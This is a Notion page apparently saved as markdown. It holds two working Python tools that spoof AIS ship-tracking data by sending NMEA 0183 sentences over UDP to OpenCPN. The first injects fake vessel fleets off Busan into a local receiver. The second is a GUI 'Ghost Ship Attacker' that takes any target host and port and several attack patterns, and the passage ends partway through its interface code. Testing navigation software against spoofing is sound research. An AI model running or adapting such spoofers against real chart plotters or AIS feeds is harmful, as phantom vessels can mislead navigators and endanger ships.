---
notion_url: https://www.notion.so/32cbe080983080d6a7bbf2426c5d44b9
last_synced: 2026-06-22 01:04
tags: [notion-sync]
---

# ghost ship gen

- 테스트

![image](_assets/image.png)


```python
#!/usr/bin/env python3
"""
OpenCPN 유령선박 테스트 - NMEA 0183 UDP 송신기
부산 앞바다 기준 유령선단 시뮬레이션

신호 구성:
  - 원형 유령선단  : 부산 앞바다 중심으로 큰 원형 항행 (15척)
  - JBU 글자 선박  : J, B, U 알파벳 형태로 배치된 유령선박 (각 글자 5~7척)
  - 중앙 정상선박  : 원 중앙에 멈춰있는 정상 AIS 선박 (1척)

target: localhost:1111 (UDP)
"""

import socket
import time
import math
import random
import threading

# ──────────────── 기본 설정 ────────────────
UDP_HOST = "127.0.0.1"
UDP_PORT = 1111

# 부산 앞바다 중심 좌표 (가덕도 동쪽 외해)
CENTER_LAT = 35.05
CENTER_LON = 129.15

# 원형 선단 반지름 (도 단위 ≈ 약 25km)
CIRCLE_RADIUS = 0.22

# 업데이트 주기 (초)
UPDATE_INTERVAL = 2.0

# ──────────────── NMEA 유틸 ────────────────

def nmea_checksum(sentence: str) -> str:
    """NMEA 문장의 체크섬 계산 ($ ~ * 사이)"""
    chk = 0
    for ch in sentence:
        chk ^= ord(ch)
    return f"{chk:02X}"


def build_vdm(mmsi: int, lat: float, lon: float,
              sog: float, cog: float, heading: int,
              nav_status: int = 0) -> str:
    """
    간단한 !AIVDM AIS Type-1 페이로드 생성.
    실제 비트 인코딩 대신 OpenCPN이 파싱할 수 있는
    완전한 NMEA VDM 문장을 반환합니다.

    nav_status:
      0 = Under way using engine
      1 = At anchor
      5 = Moored
    """
    # AIS 페이로드 비트 스트림 생성 (168비트 = Type 1)
    bits = []

    def push(val: int, n: int):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    # Message type (6)
    push(1, 6)
    # Repeat indicator (2)
    push(0, 2)
    # MMSI (30)
    push(mmsi, 30)
    # Navigation status (4)
    push(nav_status, 4)
    # ROT (8) - 0 = no info
    push(0, 8)
    # SOG (10) - 1/10 knot
    sog_int = int(round(sog * 10)) & 0x3FF
    push(sog_int, 10)
    # Position accuracy (1)
    push(1, 1)
    # Longitude (28) - 1/10000 min, E positive
    lon_int = int(round(lon * 600000)) & 0xFFFFFFF
    push(lon_int, 28)
    # Latitude (27) - 1/10000 min, N positive
    lat_int = int(round(lat * 600000)) & 0x7FFFFFF
    push(lat_int, 27)
    # COG (12) - 1/10 degree
    cog_int = int(round(cog * 10)) & 0xFFF
    push(cog_int, 12)
    # True heading (9)
    push(heading % 360, 9)
    # Time stamp (6)
    push(int(time.time()) % 60, 6)
    # Maneuver indicator (2)
    push(0, 2)
    # Spare (3)
    push(0, 3)
    # RAIM (1)
    push(0, 1)
    # Radio status (19)
    push(0, 19)

    # 패딩하여 6비트 단위로 맞춤
    while len(bits) % 6:
        bits.append(0)

    # 6비트 → ASCII 인코딩
    payload = ""
    for i in range(0, len(bits), 6):
        val = 0
        for b in bits[i:i+6]:
            val = (val << 1) | b
        char_code = val + 48
        if char_code > 87:
            char_code += 8
        payload += chr(char_code)

    fill = 0
    sentence_body = f"AIVDM,1,1,,A,{payload},{fill}"
    chk = nmea_checksum(sentence_body)
    return f"!{sentence_body}*{chk}\r\n"


def build_vsd(mmsi: int, vessel_name: str, vessel_type: int = 37,
              call_sign: str = "GHOST") -> str:
    """
    AIS Type-24 Part A (선박 이름) NMEA VDM 생성.
    OpenCPN에 선박 이름을 표시하기 위해 사용.
    """
    # 이름 최대 20자 패딩
    name = vessel_name[:20].upper().ljust(20, "@")
    bits = []

    def push(val: int, n: int):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    def push_str(s: str, chars: int):
        for ch in s[:chars]:
            c = ord(ch)
            if c >= 64:
                c -= 64
            push(c, 6)

    push(24, 6)   # message type
    push(0, 2)    # repeat
    push(mmsi, 30)
    push(0, 2)    # part number = 0 (Part A)
    push_str(name, 20)
    push(0, 8)    # spare

    while len(bits) % 6:
        bits.append(0)

    payload = ""
    for i in range(0, len(bits), 6):
        val = 0
        for b in bits[i:i+6]:
            val = (val << 1) | b
        char_code = val + 48
        if char_code > 87:
            char_code += 8
        payload += chr(char_code)

    sentence_body = f"AIVDM,1,1,,A,{payload},0"
    chk = nmea_checksum(sentence_body)
    return f"!{sentence_body}*{chk}\r\n"


# ──────────────── 선박 정의 ────────────────

class Vessel:
    def __init__(self, mmsi: int, name: str, nav_status: int = 0):
        self.mmsi = mmsi
        self.name = name
        self.nav_status = nav_status  # 0=항행중, 1=닻내림, 5=계류
        self.lat = CENTER_LAT
        self.lon = CENTER_LON
        self.sog = 0.0
        self.cog = 0.0
        self.heading = 0
        self._name_sent = False

    def position_message(self) -> str:
        return build_vdm(self.mmsi, self.lat, self.lon,
                         self.sog, self.cog, self.heading,
                         self.nav_status)

    def name_message(self) -> str:
        return build_vsd(self.mmsi, self.name)


# ──────────────── 선박 집합 구성 ────────────────

def make_circle_fleet(n: int = 15) -> list[Vessel]:
    """원형으로 항행하는 유령선단"""
    fleet = []
    for i in range(n):
        mmsi = 990100000 + i
        v = Vessel(mmsi, f"GHOST-C{i+1:02d}")
        # 초기 각도 균등 배치
        angle = (2 * math.pi / n) * i
        v._circle_angle = angle
        v._circle_speed = 0.008  # rad/update (약 0.004 rad/s)
        fleet.append(v)
    return fleet


def make_jbu_fleet() -> list[Vessel]:
    """
    J, B, U 글자 모양으로 배치된 유령선박.
    각 글자는 오프셋 좌표 (delta_lat, delta_lon) 목록으로 정의.
    선박은 각 점 사이를 순서대로 이동.
    """
    # 스케일 (도 단위, ≈ 2~3km 크기)
    s = 0.018

    # ── J ──
    # 오른쪽 위 수직선 내려오고 → 왼쪽 하단 굽힘
    j_points = [
        ( 0.08,  0.04),   # 상단 오른쪽
        ( 0.05,  0.04),
        ( 0.02,  0.04),
        (-0.01,  0.04),
        (-0.04,  0.03),   # 아래로 구부러짐
        (-0.06,  0.01),
        (-0.06, -0.02),   # J 끝 왼쪽
    ]
    j_offset = (-0.12, -0.28)  # 중심 대비 J 위치

    # ── B ──
    # 왼쪽 수직선 + 위 반원 + 아래 반원
    b_points = [
        ( 0.08,  0.0),    # 상단 왼쪽
        ( 0.04,  0.0),
        ( 0.0,   0.0),
        (-0.04,  0.0),
        (-0.08,  0.0),    # 하단 왼쪽
        (-0.06,  0.025),  # 아래 반원
        (-0.04,  0.04),
        (-0.02,  0.025),
        ( 0.0,   0.0),    # 중간 이음
        ( 0.02,  0.025),  # 위 반원
        ( 0.04,  0.04),
        ( 0.06,  0.025),
        ( 0.08,  0.0),    # 상단 다시
    ]
    b_offset = (-0.12, -0.06)

    # ── U ──
    # 왼쪽 수직선 내려와서 → 하단 곡선 → 오른쪽 수직선
    u_points = [
        ( 0.08,  0.0),    # 상단 왼쪽
        ( 0.04,  0.0),
        ( 0.0,   0.0),
        (-0.04,  0.005),
        (-0.07,  0.02),   # 하단 곡선
        (-0.07,  0.05),
        (-0.04,  0.06),
        ( 0.0,   0.06),
        ( 0.04,  0.05),
        ( 0.08,  0.02),   # 오른쪽 수직선 하단
        ( 0.08,  0.0),    # 상단 오른쪽 (닫힘)  
    ]
    # 실제로는 마지막 점은 별도 선박이 아닌 기준점으로만
    u_offset = (-0.12, 0.16)

    def make_letter_ships(points, offset, prefix, start_mmsi):
        ships = []
        for i, (dlat, dlon) in enumerate(points):
            mmsi = start_mmsi + i
            v = Vessel(mmsi, f"{prefix}{i+1:02d}")
            v.lat = CENTER_LAT + offset[0] + dlat * s / s  # s 스케일 적용
            v.lon = CENTER_LON + offset[1] + dlon * s / s
            # 글자 좌표를 실제 위도/경도 오프셋으로
            v.lat = CENTER_LAT + offset[0] + dlat
            v.lon = CENTER_LON + offset[1] + dlon
            # 순환 경로 포인트 저장
            v._waypoints = [
                (CENTER_LAT + offset[0] + p[0], CENTER_LON + offset[1] + p[1])
                for p in points
            ]
            v._wp_idx = i % len(points)
            v._wp_progress = 0.0
            v.sog = 3.0 + random.uniform(-0.5, 0.5)
            ships.append(v)
        return ships

    fleet = []
    fleet += make_letter_ships(j_points, j_offset, "GHOST-J", 990200000)
    fleet += make_letter_ships(b_points, b_offset, "GHOST-B", 990300000)
    fleet += make_letter_ships(u_points, u_offset, "GHOST-U", 990400000)
    return fleet


def make_center_vessel() -> Vessel:
    """원 중앙에 정박한 정상 선박"""
    v = Vessel(mmsi=440123456, name="BUSAN ANCHOR", nav_status=1)
    v.lat = CENTER_LAT
    v.lon = CENTER_LON
    v.sog = 0.0
    v.cog = 0.0
    v.heading = 45
    return v


# ──────────────── 위치 업데이트 ────────────────

def update_circle_fleet(fleet: list[Vessel], t: float):
    n = len(fleet)
    for i, v in enumerate(fleet):
        angle = v._circle_angle + t * v._circle_speed
        v.lat = CENTER_LAT + CIRCLE_RADIUS * math.sin(angle)
        v.lon = CENTER_LON + CIRCLE_RADIUS * math.cos(angle) * 1.2  # 경도 보정
        # COG/heading = 진행 방향 (접선 방향)
        v.cog = (math.degrees(angle + math.pi / 2)) % 360
        v.heading = int(v.cog)
        v.sog = 8.0 + 2.0 * math.sin(angle * 3)  # 약간의 속도 변화


def update_jbu_fleet(fleet: list[Vessel], dt: float):
    """각 선박을 waypoint 따라 이동"""
    for v in fleet:
        if not hasattr(v, '_waypoints') or len(v._waypoints) < 2:
            continue
        wps = v._waypoints
        cur = v._wp_idx % len(wps)
        nxt = (cur + 1) % len(wps)
        clat, clon = wps[cur]
        nlat, nlon = wps[nxt]

        dist = math.sqrt((nlat - clat)**2 + (nlon - clon)**2)
        if dist < 1e-9:
            v._wp_idx = nxt
            continue

        # 이동 속도: SOG → 도/초 근사 (1도≈111km, SOG knots)
        step = v.sog * 0.000154 * dt / 3600 * 1852 / 111000

        v._wp_progress += step / dist
        if v._wp_progress >= 1.0:
            v._wp_progress = 0.0
            v._wp_idx = nxt
            cur, nxt = nxt, (nxt + 1) % len(wps)
            clat, clon = wps[cur]
            nlat, nlon = wps[nxt]
            dist = math.sqrt((nlat - clat)**2 + (nlon - clon)**2)

        p = v._wp_progress
        v.lat = clat + (nlat - clat) * p
        v.lon = clon + (nlon - clon) * p

        dx = nlon - clon
        dy = nlat - clat
        v.cog = (math.degrees(math.atan2(dx, dy))) % 360
        v.heading = int(v.cog)


# ──────────────── UDP 송신 ────────────────

def send_nmea(sock: socket.socket, msg: str):
    try:
        sock.sendto(msg.encode("ascii"), (UDP_HOST, UDP_PORT))
    except Exception as e:
        print(f"[송신 오류] {e}")


def main():
    print("=" * 60)
    print("  OpenCPN 유령선박 UDP 테스트 송신기")
    print(f"  목적지: {UDP_HOST}:{UDP_PORT}")
    print(f"  중심 좌표: {CENTER_LAT}°N, {CENTER_LON}°E (부산 앞바다)")
    print("=" * 60)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    circle_fleet = make_circle_fleet(15)
    jbu_fleet = make_jbu_fleet()
    center_vessel = make_center_vessel()

    all_vessels: list[Vessel] = circle_fleet + jbu_fleet + [center_vessel]
    name_sent: set[int] = set()

    print(f"\n선박 수:")
    print(f"  원형 선단  : {len(circle_fleet)}척")
    print(f"  JBU 선단   : {len(jbu_fleet)}척")
    print(f"  중앙 정상  : 1척")
    print(f"  합계       : {len(all_vessels)}척")
    print(f"\n[Ctrl+C 로 중단]\n")

    t = 0.0
    iteration = 0

    try:
        while True:
            iteration += 1
            start = time.time()

            # 위치 업데이트
            update_circle_fleet(circle_fleet, t)
            update_jbu_fleet(jbu_fleet, UPDATE_INTERVAL)

            # 모든 선박 신호 송신
            for v in all_vessels:
                # 최초 1회 이름 전송 (Type-24)
                if v.mmsi not in name_sent:
                    send_nmea(sock, v.name_message())
                    name_sent.add(v.mmsi)
                    time.sleep(0.01)

                # 위치 신호 (Type-1)
                send_nmea(sock, v.position_message())
                time.sleep(0.005)  # 선박 간 미세 딜레이

            elapsed = time.time() - start
            t += UPDATE_INTERVAL

            if iteration % 10 == 0:
                print(f"[{iteration:4d}회] 송신 완료 | "
                      f"원형각도 예시: {math.degrees(circle_fleet[0]._circle_angle + t * circle_fleet[0]._circle_speed):.1f}° | "
                      f"중앙선박: {center_vessel.lat:.4f}°N {center_vessel.lon:.4f}°E")

            # 다음 업데이트까지 대기
            sleep_t = max(0, UPDATE_INTERVAL - elapsed)
            time.sleep(sleep_t)

    except KeyboardInterrupt:
        print("\n\n[중단] 송신 종료.")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
```


![image](_assets/image.png)

gui 코드

```python
#!/usr/bin/env python3
"""
OpenCPN 유령선박 공격 커스터마이저 - GUI 버전
Windows 환경 / tkinter 기반
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import time
import math
import random
import threading
import queue

# ──────────────── 전역 상태 ────────────────
running = False
send_thread = None
log_queue = queue.Queue()


# ──────────────── NMEA 유틸 ────────────────

def nmea_checksum(sentence: str) -> str:
    chk = 0
    for ch in sentence:
        chk ^= ord(ch)
    return f"{chk:02X}"


def build_vdm(mmsi, lat, lon, sog, cog, heading, nav_status=0):
    bits = []

    def push(val, n):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    push(1, 6)
    push(0, 2)
    push(mmsi, 30)
    push(nav_status, 4)
    push(0, 8)
    push(int(round(sog * 10)) & 0x3FF, 10)
    push(1, 1)
    push(int(round(lon * 600000)) & 0xFFFFFFF, 28)
    push(int(round(lat * 600000)) & 0x7FFFFFF, 27)
    push(int(round(cog * 10)) & 0xFFF, 12)
    push(heading % 360, 9)
    push(int(time.time()) % 60, 6)
    push(0, 2)
    push(0, 3)
    push(0, 1)
    push(0, 19)

    while len(bits) % 6:
        bits.append(0)

    payload = ""
    for i in range(0, len(bits), 6):
        val = 0
        for b in bits[i:i+6]:
            val = (val << 1) | b
        char_code = val + 48
        if char_code > 87:
            char_code += 8
        payload += chr(char_code)

    sentence_body = f"AIVDM,1,1,,A,{payload},0"
    chk = nmea_checksum(sentence_body)
    return f"!{sentence_body}*{chk}\r\n"


def build_vsd(mmsi, vessel_name):
    name = vessel_name[:20].upper().ljust(20, "@")
    bits = []

    def push(val, n):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    def push_str(s, chars):
        for ch in s[:chars]:
            c = ord(ch)
            if c >= 64:
                c -= 64
            push(c, 6)

    push(24, 6)
    push(0, 2)
    push(mmsi, 30)
    push(0, 2)
    push_str(name, 20)
    push(0, 8)

    while len(bits) % 6:
        bits.append(0)

    payload = ""
    for i in range(0, len(bits), 6):
        val = 0
        for b in bits[i:i+6]:
            val = (val << 1) | b
        char_code = val + 48
        if char_code > 87:
            char_code += 8
        payload += chr(char_code)

    sentence_body = f"AIVDM,1,1,,A,{payload},0"
    chk = nmea_checksum(sentence_body)
    return f"!{sentence_body}*{chk}\r\n"


# ──────────────── 선박 클래스 ────────────────

class Vessel:
    def __init__(self, mmsi, name, nav_status=0):
        self.mmsi = mmsi
        self.name = name
        self.nav_status = nav_status
        self.lat = 0.0
        self.lon = 0.0
        self.sog = 0.0
        self.cog = 0.0
        self.heading = 0

    def position_message(self):
        return build_vdm(self.mmsi, self.lat, self.lon,
                         self.sog, self.cog, self.heading, self.nav_status)

    def name_message(self):
        return build_vsd(self.mmsi, self.name)


# ──────────────── 공격 유형별 선박 생성 ────────────────

def make_circle_fleet(cfg):
    center_lat = cfg['center_lat']
    center_lon = cfg['center_lon']
    n = cfg['circle_count']
    radius = cfg['circle_radius']
    speed = cfg['circle_speed']
    fleet = []
    for i in range(n):
        angle = (2 * math.pi / n) * i
        v = Vessel(990100000 + i, f"GHOST-C{i+1:02d}")
        v._circle_angle = angle
        v._circle_speed = speed
        v._center_lat = center_lat
        v._center_lon = center_lon
        v._radius = radius
        fleet.append(v)
    return fleet


def update_circle_fleet(fleet, t):
    for v in fleet:
        if not hasattr(v, '_circle_angle'):
            continue
        angle = v._circle_angle + t * v._circle_speed
        v.lat = v._center_lat + v._radius * math.sin(angle)
        v.lon = v._center_lon + v._radius * math.cos(angle) * 1.2
        v.cog = (math.degrees(angle + math.pi / 2)) % 360
        v.heading = int(v.cog)
        v.sog = 8.0 + 2.0 * math.sin(angle * 3)


def make_grid_fleet(cfg):
    center_lat = cfg['center_lat']
    center_lon = cfg['center_lon']
    rows = cfg['grid_rows']
    cols = cfg['grid_cols']
    spacing = cfg['grid_spacing']
    fleet = []
    idx = 0
    for r in range(rows):
        for c in range(cols):
            dlat = (r - rows / 2) * spacing
            dlon = (c - cols / 2) * spacing * 1.2
            v = Vessel(990500000 + idx, f"GHOST-G{idx+1:02d}")
            v.lat = center_lat + dlat
            v.lon = center_lon + dlon
            v.sog = cfg['grid_speed']
            v.cog = cfg['grid_heading']
            v.heading = int(cfg['grid_heading'])
            v._drift_lat = random.uniform(-0.0002, 0.0002)
            v._drift_lon = random.uniform(-0.0002, 0.0002)
            fleet.append(v)
            idx += 1
    return fleet


def update_grid_fleet(fleet, dt):
    for v in fleet:
        if not hasattr(v, '_drift_lat'):
            continue
        rad = math.radians(v.cog)
        step = v.sog * dt * 0.000154 / 3600 * 1852 / 111000
        v.lat += math.cos(rad) * step + v._drift_lat * dt * 0.1
        v.lon += math.sin(rad) * step + v._drift_lon * dt * 0.1


def make_spiral_fleet(cfg):
    center_lat = cfg['center_lat']
    center_lon = cfg['center_lon']
    n = cfg['spiral_count']
    turns = cfg['spiral_turns']
    max_r = cfg['spiral_max_radius']
    fleet = []
    for i in range(n):
        t_ratio = i / max(n - 1, 1)
        angle = 2 * math.pi * turns * t_ratio
        r = max_r * t_ratio
        v = Vessel(990600000 + i, f"GHOST-S{i+1:02d}")
        v.lat = center_lat + r * math.sin(angle)
        v.lon = center_lon + r * math.cos(angle) * 1.2
        v._spiral_angle = angle
        v._spiral_r = r
        v._spiral_speed = cfg['spiral_speed']
        v._center_lat = center_lat
        v._center_lon = center_lon
        v._max_r = max_r
        v._turns = turns
        v._n = n
        v._idx = i
        fleet.append(v)
    return fleet


def update_spiral_fleet(fleet, t):
    for v in fleet:
        if not hasattr(v, '_idx'):
            continue
        base_t = v._idx / max(v._n - 1, 1)
        angle = 2 * math.pi * v._turns * base_t + t * v._spiral_speed
        r = v._max_r * base_t
        v.lat = v._center_lat + r * math.sin(angle)
        v.lon = v._center_lon + r * math.cos(angle) * 1.2
        v.cog = (math.degrees(angle + math.pi / 2)) % 360
        v.heading = int(v.cog)
        v.sog = 5.0 + r * 20


def make_random_fleet(cfg):
    center_lat = cfg['center_lat']
    center_lon = cfg['center_lon']
    n = cfg['random_count']
    spread = cfg['random_spread']
    fleet = []
    for i in range(n):
        v = Vessel(990700000 + i, f"GHOST-R{i+1:02d}")
        v.lat = center_lat + random.uniform(-spread, spread)
        v.lon = center_lon + random.uniform(-spread * 1.2, spread * 1.2)
        v.sog = random.uniform(2.0, 15.0)
        v.cog = random.uniform(0, 360)
        v.heading = int(v.cog)
        v._drift_lat = random.uniform(-0.001, 0.001)
        v._drift_lon = random.uniform(-0.001, 0.001)
        fleet.append(v)
    return fleet


def update_random_fleet(fleet, dt):
    for v in fleet:
        if not hasattr(v, '_drift_lat'):
            continue
        # 랜덤 방향 변화
        v.cog = (v.cog + random.uniform(-5, 5)) % 360
        v.heading = int(v.cog)
        rad = math.radians(v.cog)
        step = v.sog * dt * 0.000154 / 3600 * 1852 / 111000
        v.lat += math.cos(rad) * step
        v.lon += math.sin(rad) * step


def make_jbu_fleet(cfg):
    center_lat = cfg['center_lat']
    center_lon = cfg['center_lon']
    scale = cfg['jbu_scale']

    j_points = [
        (0.08, 0.04), (0.05, 0.04), (0.02, 0.04),
        (-0.01, 0.04), (-0.04, 0.03), (-0.06, 0.01), (-0.06, -0.02),
    ]
    b_points = [
        (0.08, 0.0), (0.04, 0.0), (0.0, 0.0), (-0.04, 0.0), (-0.08, 0.0),
        (-0.06, 0.025), (-0.04, 0.04), (-0.02, 0.025), (0.0, 0.0),
        (0.02, 0.025), (0.04, 0.04), (0.06, 0.025), (0.08, 0.0),
    ]
    u_points = [
        (0.08, 0.0), (0.04, 0.0), (0.0, 0.0), (-0.04, 0.005),
        (-0.07, 0.02), (-0.07, 0.05), (-0.04, 0.06), (0.0, 0.06),
        (0.04, 0.05), (0.08, 0.02),
    ]

    j_offset = (-0.12 * scale, -0.28 * scale)
    b_offset = (-0.12 * scale, -0.06 * scale)
    u_offset = (-0.12 * scale, 0.16 * scale)

    fleet = []

    def make_letter(points, offset, prefix, start_mmsi):
        ships = []
        for i, (dlat, dlon) in enumerate(points):
            v = Vessel(start_mmsi + i, f"{prefix}{i+1:02d}")
            v.lat = center_lat + offset[0] + dlat * scale
            v.lon = center_lon + offset[1] + dlon * scale
            v._waypoints = [
                (center_lat + offset[0] + p[0] * scale,
                 center_lon + offset[1] + p[1] * scale)
                for p in points
            ]
            v._wp_idx = i % len(points)
            v._wp_progress = 0.0
            v.sog = 3.0 + random.uniform(-0.5, 0.5)
            ships.append(v)
        return ships

    fleet += make_letter(j_points, j_offset, "GHOST-J", 990200000)
    fleet += make_letter(b_points, b_offset, "GHOST-B", 990300000)
    fleet += make_letter(u_points, u_offset, "GHOST-U", 990400000)
    return fleet


def update_jbu_fleet(fleet, dt):
    for v in fleet:
        if not hasattr(v, '_waypoints') or len(v._waypoints) < 2:
            continue
        wps = v._waypoints
        cur = v._wp_idx % len(wps)
        nxt = (cur + 1) % len(wps)
        clat, clon = wps[cur]
        nlat, nlon = wps[nxt]
        dist = math.sqrt((nlat - clat) ** 2 + (nlon - clon) ** 2)
        if dist < 1e-9:
            v._wp_idx = nxt
            continue
        step = v.sog * 0.000154 * dt / 3600 * 1852 / 111000
        v._wp_progress += step / dist
        if v._wp_progress >= 1.0:
            v._wp_progress = 0.0
            v._wp_idx = nxt
            cur, nxt = nxt, (nxt + 1) % len(wps)
            clat, clon = wps[cur]
            nlat, nlon = wps[nxt]
        p = v._wp_progress
        v.lat = clat + (nlat - clat) * p
        v.lon = clon + (nlon - clon) * p
        dx = nlon - clon
        dy = nlat - clat
        v.cog = (math.degrees(math.atan2(dx, dy))) % 360
        v.heading = int(v.cog)


# ──────────────── 송신 루프 ────────────────

def send_loop(cfg, log_q):
    host = cfg['host']
    port = cfg['port']
    interval = cfg['interval']
    attack_type = cfg['attack_type']

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 공격 유형에 따라 선단 생성
    fleet = []
    if attack_type == "원형 선단":
        fleet = make_circle_fleet(cfg)
    elif attack_type == "격자 선단":
        fleet = make_grid_fleet(cfg)
    elif attack_type == "나선형":
        fleet = make_spiral_fleet(cfg)
    elif attack_type == "랜덤 확산":
        fleet = make_random_fleet(cfg)
    elif attack_type == "JBU 글자":
        fleet = make_jbu_fleet(cfg)

    # 정박 선박 추가
    if cfg.get('add_anchor'):
        anchor = Vessel(440123456, "BUSAN ANCHOR", nav_status=1)
        anchor.lat = cfg['center_lat']
        anchor.lon = cfg['center_lon']
        anchor.sog = 0.0
        anchor.cog = 0.0
        anchor.heading = 45
        fleet.append(anchor)

    name_sent = set()
    t = 0.0
    iteration = 0

    log_q.put(f"[시작] 공격 유형: {attack_type} | 선박 수: {len(fleet)}척")
    log_q.put(f"[전송] {host}:{port} → 업데이트 주기 {interval}s")

    try:
        while running:
            iteration += 1
            start = time.time()

            # 위치 업데이트
            if attack_type == "원형 선단":
                update_circle_fleet(fleet, t)
            elif attack_type == "격자 선단":
                update_grid_fleet(fleet, interval)
            elif attack_type == "나선형":
                update_spiral_fleet(fleet, t)
            elif attack_type == "랜덤 확산":
                update_random_fleet(fleet, interval)
            elif attack_type == "JBU 글자":
                update_jbu_fleet(fleet, interval)

            # 송신
            sent = 0
            for v in fleet:
                if v.mmsi not in name_sent:
                    try:
                        sock.sendto(v.name_message().encode("ascii"), (host, port))
                        name_sent.add(v.mmsi)
                    except Exception as e:
                        log_q.put(f"[오류] 이름 전송 실패: {e}")
                    time.sleep(0.01)
                try:
                    sock.sendto(v.position_message().encode("ascii"), (host, port))
                    sent += 1
                except Exception as e:
                    log_q.put(f"[오류] 위치 전송 실패: {e}")
                time.sleep(0.005)

            elapsed = time.time() - start
            t += interval

            if iteration % 5 == 0:
                log_q.put(f"[{iteration:4d}회] 전송 {sent}척 | 경과 {elapsed:.2f}s")

            sleep_t = max(0, interval - elapsed)
            time.sleep(sleep_t)

    except Exception as e:
        log_q.put(f"[치명적 오류] {e}")
    finally:
        sock.close()
        log_q.put("[종료] 송신 스레드 종료됨.")


# ──────────────── GUI ────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("⚓ OpenCPN Ghost Ship Attacker")
        self.configure(bg="#0a0e1a")
        self.resizable(True, True)
        self.minsize(900, 700)

        self._setup_styles()
        self._build_ui()
        self._poll_log()

    def _setup_styles(self):
        style = ttk.Style(self)
        style.theme_use("clam")

        bg = "#0a0e1a"
        panel = "#111827"
        accent = "#00d4ff"
        accent2 = "#ff4757"
        fg = "#e2e8f0"
        fg2 = "#94a3b8"
        entry_bg = "#1e2a3a"

        style.configure(".", background=bg, foreground=fg, font=("Consolas", 10))
        style.configure("TFrame", background=bg)
        style.configure("TLabel", background=bg, foreground=fg, font=("Consolas", 10))
        style.configure("Header.TLabel", background=bg, foreground=accent,
                        font=("Consolas", 13, "bold"))
        style.configure("Sub.TLabel", background=bg, foreground=fg2,
                        font=("Consolas", 9))
        style.configure("Panel.TFrame", background=panel,
                        relief="flat")
        style.configure("TEntry", fieldbackground=entry_bg, foreground=fg,
                        insertcolor=accent, borderwidth=0,
                        font=("Consolas", 10))
        style.configure("TCombobox", fieldbackground=entry_bg, foreground=fg,
                        selectbackground=accent, selectforeground=bg,
                        font=("Consolas", 10))
        style.map("TCombobox", fieldbackground=[("readonly", entry_bg)])
        style.configure("TNotebook", background=bg, borderwidth=0)
        style.configure("TNotebook.Tab", background=panel, foreground=fg2,
                        padding=[14, 6], font=("Consolas", 10))
        style.map("TNotebook.Tab",
                  background=[("selected", entry_bg)],
                  foreground=[("selected", accent)])
        style.configure("TScale", background=bg, troughcolor=entry_bg,
                        slidercolor=accent)
        style.configure("TCheckbutton", background=bg, foreground=fg,
                        font=("Consolas", 10))
        style.map("TCheckbutton", background=[("active", bg)])
        style.configure("TSeparator", background="#1e2a3a")

    def _section(self, parent, title):
        f = ttk.Frame(parent)
        f.pack(fill="x", padx=10, pady=(10, 2))
        ttk.Label(f, text=f"▸ {title}", style="Header.TLabel").pack(anchor="w")
        sep = tk.Frame(parent, height=1, bg="#1e2a3a")
        sep.pack(fill="x", padx=10, pady=(0, 6))
        return f

    def _row(self, parent, label, widget_factory, **kwargs):
        """라벨 + 위젯 한 줄"""
        row = ttk.Frame(parent)
        row.pack(fill="x", padx=16, pady=2)
        lbl = ttk.Label(row, text=label, width=22, anchor="w", style="Sub.TLabel")
        lbl.pack(side="left")
        w = widget_factory(row, **kwargs)
        w.pack(side="left", fill="x", expand=True)
        return w

    def _entry(self, parent, default="", **kwargs):
        var = tk.StringVar(value=str(default))
        e = ttk.Entry(parent, textvariable=var, **kwargs)
        e._var = var
        return e

    def _spin(self, parent, from_, to, default, step=1.0):
        var = tk.DoubleVar(value=default)
        sb = ttk.Spinbox(parent, from_=from_, to=to, increment=step,
                         textvariable=var,
                         font=("Consolas", 10))
        sb._var = var
        return sb

    def _build_ui(self):
        # ── 타이틀 바 ──
        title_bar = ttk.Frame(self)
        title_bar.pack(fill="x", padx=0, pady=0)
        tk.Label(title_bar,
                 text="  ⚓  OPENCPN  GHOST SHIP  ATTACKER",
                 bg="#00d4ff", fg="#0a0e1a",
                 font=("Consolas", 14, "bold"),
                 padx=10, pady=8).pack(fill="x")
        tk.Label(title_bar,
                 text="  AIS NMEA 0183 UDP Spoofer  |  Research & Testing Tool",
                 bg="#0d1b2a", fg="#64748b",
                 font=("Consolas", 9),
                 padx=10, pady=3).pack(fill="x")

        # ── 메인 레이아웃 ──
        main = ttk.Frame(self)
        main.pack(fill="both", expand=True, padx=0, pady=0)

        # 왼쪽 설정 패널
        left = ttk.Frame(main)
        left.pack(side="left", fill="both", expand=False, padx=0, pady=0)

        canvas = tk.Canvas(left, bg="#0a0e1a", highlightthickness=0, width=420)
        scrollbar = ttk.Scrollbar(left, orient="vertical", command=canvas.yview)
        self.scroll_frame = ttk.Frame(canvas)
        self.scroll_frame.bind("<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=self.scroll_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        canvas.bind_all("<MouseWheel>",
            lambda e: canvas.yview_scroll(-1 * (e.delta // 120), "units"))

        sf = self.scroll_frame
        self._build_network_section(sf)
        self._build_center_section(sf)
        self._build_attack_section(sf)
        self._build_circle_section(sf)
        self._build_grid_section(sf)
        self._build_spiral_section(sf)
        self._build_random_section(sf)
        self._build_jbu_section(sf)
        self._build_extra_section(sf)
        self._build_control_section(sf)

        # 오른쪽 로그 패널
        right = ttk.Frame(main)
        right.pack(side="right", fill="both", expand=True, padx=0, pady=0)

        tk.Label(right, text="◉  LIVE TRANSMISSION LOG",
                 bg="#0a0e1a", fg="#00d4ff",
                 font=("Consolas", 11, "bold"),
                 padx=12, pady=8).pack(fill="x")

        self.log_box = scrolledtext.ScrolledText(
            right,
            bg="#060d14", fg="#4ade80",
            font=("Consolas", 9),
            insertbackground="#00d4ff",
            selectbackground="#1e3a5f",
            relief="flat",
            borderwidth=0,
            wrap="word"
        )
        self.log_box.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.log_box.tag_config("error", foreground="#ff4757")
        self.log_box.tag_config("start", foreground="#00d4ff")
